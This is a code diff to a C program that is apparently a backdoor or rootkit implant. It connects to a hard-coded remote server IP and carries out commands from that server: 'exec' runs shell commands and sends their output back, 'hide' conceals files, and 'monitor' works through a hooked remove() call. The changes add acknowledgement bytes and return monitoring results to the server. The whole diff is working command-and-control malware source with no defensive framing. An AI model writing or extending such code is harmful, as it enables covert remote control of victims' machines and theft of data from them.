@@ -14,13 +14,17 @@
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
 #define CMD_RESULT "cmdoutput.txttmp"
-char* SERVER_ADDR = "104.194.96.169";  
+#define MONITOR_RESULT "monitoroutput.txttmp"
+
+char* SERVER_ADDR = "104.194.96.169"; 
+char zero[1] = "0";
+char one[1] = "1"; 
 
 int readbuf(int conn, char* buf, int size);
 int readline(int conn, char* buf, int size);
 int getIntFromBuf(char* buf, int offset);
 int execcmd(char* cmd);
-int sendresult(int socket, char* buf);
+int sendresult(int socket, char* buf, char *name);
 int hidefile(char* cmd);
 int monitor(char* cmd);
 
@@ -31,7 +35,7 @@ int main(int argc,char* argv[])
     struct sockaddr_in servaddr;
     char buf[BUFFER_SIZE];
     int filesize, chunk, rv;
-      
+    
     char *cmd;
     struct timeval timeout={1800,0};
     if(argc > 1){
@@ -60,16 +64,25 @@ int main(int argc,char* argv[])
             readline(sock_fd, buf, BUFFER_SIZE);
             
             if(strcmp(buf, "close") == 0){
+                send(sock_fd, zero, 1, 0);
                 break;
             } else if(strncmp(buf, "exec", 4) == 0){
                 rv = execcmd(buf + 4);
                 if(rv > 0){
-                    sendresult(sock_fd, buf);
+                    sendresult(sock_fd, buf, CMD_RESULT);
+                } else {
+                    send(sock_fd, zero, 1, 0);
                 }
             } else if(strncmp(buf, "hide", 4) == 0){
-                hidefile(buf + 4);
+                rv = hidefile(buf + 4);
+                send(sock_fd, zero, 1, 0);
             } else if(strncmp(buf, "monitor", 7) == 0){
-                monitor(buf + 7);
+                rv = monitor(buf + 7);
+                if(rv > 0){
+                    sendresult(sock_fd, buf, MONITOR_RESULT);
+                } else {
+                    send(sock_fd, zero, 1, 0);
+                }
             }
         }
     }
@@ -78,11 +91,17 @@ int main(int argc,char* argv[])
     return 0;
 }
 
-int sendresult(int socket, char* buf){
+int sendresult(int socket, char* buf, char *name){
     FILE *fp;
     int i = 0;
     
-    fp=fopen(CMD_RESULT,"r");
+    fp=fopen(name,"r");
+    if(fp == NULL){
+        send(socket, zero, 1, 0);
+    } else {
+        send(socket, one, 1, 0);
+    }
+    
     while((buf[i]=fgetc(fp)) != EOF && i < BUFFER_SIZE-1){
         i++;
     }
@@ -104,8 +123,15 @@ int hidefile(char* cmd){
 int monitor(char* cmd){
     char filen[256] = "SETMONITORPROGRAM%";
     while(*cmd == ' ') cmd++;
+    
     memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
     remove(filen);          //We hooked remove;
+    
+    if(strncmp(cmd, "getdata", 7) == 0){
+        return 1;
+    } else {
+        return 0;
+    }
 }
 
 int execcmd(char* cmd){
